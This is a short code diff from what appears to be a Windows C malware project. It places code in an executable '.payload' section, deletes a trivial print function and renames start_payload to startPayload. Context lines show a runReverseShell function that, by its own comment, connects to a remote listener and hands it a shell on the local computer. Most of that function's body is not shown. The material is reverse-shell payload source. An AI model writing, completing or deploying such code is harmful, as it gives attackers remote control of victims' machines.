@@ -3,12 +3,7 @@
 
 #pragma section(".payload", read, write, execute)
 #pragma comment(linker, "/SECTION:.payload,ERW")
-
 #pragma code_seg(".payload")
-
-void print_whatever() {
-	printf("mreow\n");
-}
 
 // connects to a listening remote computer and passes it a shell on the local computer
 void runReverseShell(const char *address, const char *port) {
@@ -71,7 +66,7 @@ void runReverseShell(const char *address, const char *port) {
 	WaitForSingleObject(processInformation.hProcess, INFINITE);
 }
 
-int start_payload(int argc, const char *argv[]) {
+int startPayload(int argc, const char *argv[]) {
 	payloadInit();
 
 	// check that we have the correct number of args
